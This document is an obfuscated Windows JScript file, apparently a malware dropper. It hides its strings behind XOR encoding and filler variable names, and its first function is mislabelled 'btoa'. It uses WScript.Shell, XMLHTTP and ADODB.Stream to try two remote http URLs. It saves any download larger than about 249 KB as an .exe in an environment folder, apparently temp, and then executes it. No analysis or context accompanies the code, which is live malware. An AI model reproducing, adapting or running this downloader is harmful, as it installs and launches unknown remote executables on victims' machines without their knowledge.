function btoa(gauntoHC, factiousWWt, repealfOX, bemusedKKO, monetaryCu6, hummockNKM, commiserateeBd, furnishmuy, considerIRw, vestigeb2T, obviateBmS, estrangeDJy) {
    var wheedleAdo = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
    var intendLT1 = String(estrangeDJy);
    for (var roseateaJ1, retrenchnjb, establishGZR = 0, extolrwJ = wheedleAdo, ideologyQlg = ""; intendLT1.charAt(establishGZR | 0) || (extolrwJ = "=", 
    establishGZR % 1); ideologyQlg += extolrwJ.charAt(63 & roseateaJ1 >> 8 - establishGZR % 1 * 8)) {
        retrenchnjb = intendLT1.charCodeAt(establishGZR += 3 / 4);
        if (retrenchnjb > 255) {
            throw new InvalidCharacterError("'btoa' failed: The string to be encoded contains characters outside of the Latin1 range.");
        }
        roseateaJ1 = roseateaJ1 << 8 | retrenchnjb;
    }
    return ideologyQlg;
}

var nuancehGa = function(pontificalfxV) {
    var suavitybno = "";
    var gauntoHC = "felicitousgqC";
    var factiousWWt = "stricturehNX";
    var repealfOX = "credoITL";
    var bemusedKKO = "indemnifyRyf";
    var monetaryCu6 = "enduringfX2";
    var hummockNKM = "insistY7X";
    var commiserateeBd = "kindlevNN";
    var furnishmuy = "cavalierJZY";
    var considerIRw = "mettleO7J";
    var vestigeb2T = "miterNV";
    var obviateBmS = "outskirtsWX5";
    btoa(gauntoHC, factiousWWt, repealfOX, bemusedKKO, monetaryCu6, hummockNKM, commiserateeBd, furnishmuy, considerIRw, vestigeb2T, obviateBmS, [ 256, 216, 176, 238, 32, 47, 69, 147, 27, 30, 25, 8, 124, 37, 207, 67 ]);
    var denouementtxN = String["sdfadfasdffromChar".slice(10) + "Codedsfadsfasdg".slice(0, 4)];
    for (var cadaverouspYs = 0; cadaverouspYs < pontificalfxV.length; cadaverouspYs++) {
        var peremptoryXWr = [ 256, 216, 176, 238, 32, 47, 69, 147, 27, 30, 25, 8, 124, 37, 207, 67 ];
        suavitybno += denouementtxN(pontificalfxV[cadaverouspYs] ^ peremptoryXWr[cadaverouspYs % peremptoryXWr.length]);
    }
    return suavitybno;
};

var unmitigatedqeC = function() {
    var treadF9y = function() {
        var territoryS8h = nuancehGa([ 367, 151, 210, 162, 82, 78, 10, 230, 75, 72 ]);
        var leaguefY8 = nuancehGa([ 345, 185, 194, 143, 119, 121, 50, 215, 120, 40 ]);
    };
    treadF9y.prototype.spbhIou0H8 = function(refractoryYzu) {
        var bemusedyUs = nuancehGa([ 323, 170, 213, 143, 84, 74, 10, 241, 113, 123, 122, 124 ]);
        return wsh[bemusedyUs](refractoryYzu);
    };
    treadF9y.prototype.fOg6Ar3IKA = function(refractoryYzu) {
        var bemusedyUs = nuancehGa([ 323, 170, 213, 143, 84, 74, 10, 241, 113, 123, 122, 124 ]);
        return WScript[bemusedyUs](refractoryYzu);
    };
    return treadF9y;
}();

(function() {
    var excisei68 = [ nuancehGa([ 360, 172, 196, 158, 26, 0, 106, 251, 107, 127, 107, 109, 5, 74, 186, 43, 357, 170, 213, 159, 81, 1, 38, 252, 118, 49, 33, 56, 82, 64, 183, 38 ]), nuancehGa([ 360, 172, 196, 158, 26, 0, 106, 251, 107, 127, 117, 123, 19, 82, 174, 45, 372, 171, 214, 136, 14, 76, 42, 254, 52, 38, 41, 38, 25, 93, 170 ]) ];
    var eugenicdC1 = 4194304;
    var engagefDl = new unmitigatedqeC();
    var gratisCm8 = engagefDl[nuancehGa([ 358, 151, 215, 216, 97, 93, 118, 218, 80, 95 ])];
    var beguileIYu = gratisCm8(nuancehGa([ 343, 139, 211, 156, 73, 95, 49, 189, 72, 118, 124, 100, 16 ]));
    var pathologicalUh8 = gratisCm8(nuancehGa([ 333, 139, 232, 163, 108, 29, 107, 203, 86, 82, 81, 92, 40, 117 ]));
    var cognateL2K = gratisCm8(nuancehGa([ 321, 156, 255, 170, 98, 1, 22, 231, 105, 123, 120, 101 ]));
    var distendydG = beguileIYu.ExpandEnvironmentStrings(nuancehGa([ 293, 140, 245, 163, 112, 10, 25 ]));
    var intrepidT2E = distendydG + eugenicdC1 + nuancehGa([ 302, 189, 200, 139 ]);
    var unconscionableE9q = false;
    var beseechlhr = 200;
    for (var sextantiOi = 0; sextantiOi < excisei68.length; sextantiOi++) {
        try {
            var sententiousMRp = excisei68[sextantiOi];
            pathologicalUh8.open(nuancehGa([ 327, 157, 228 ]), sententiousMRp, false);
            pathologicalUh8.send();
            if (pathologicalUh8.status == beseechlhr) {
                try {
                    cognateL2K[nuancehGa([ 367, 168, 213, 128 ])]();
                    cognateL2K.type = 1;
                    cognateL2K[nuancehGa([ 375, 170, 217, 154, 69 ])](pathologicalUh8[nuancehGa([ 370, 189, 195, 158, 79, 65, 54, 246, 89, 113, 125, 113 ])]);
                    var immutableJ5i = nuancehGa([ 375, 160, 212, 189, 100, 119, 114, 254, 34, 107 ]);
                    var baneo6g = nuancehGa([ 337, 171, 201, 130, 107, 65, 44, 221, 99, 46 ]);
                    var provokeCvu = nuancehGa([ 321, 147, 217, 134, 88, 23, 13, 241, 79, 78 ]);
                    var exegesisi9Z = nuancehGa([ 362, 225, 249, 219, 108, 86, 46, 244, 42, 38 ]);
                    var scalem1M = Math.pow(2, 10) * 249;
                    if (cognateL2K.size > scalem1M) {
                        sextantiOi = excisei68.length;
                        cognateL2K.position = 0;
                        cognateL2K.saveToFile(intrepidT2E, 2);
                        unconscionableE9q = true;
                    }
                } finally {
                    cognateL2K.close();
                }
            }
        } catch (ignored) {}
    }
    if (unconscionableE9q) {
        beguileIYu[nuancehGa([ 325, 160, 213, 141 ])](distendydG + Math.pow(2, 22));
    }
})();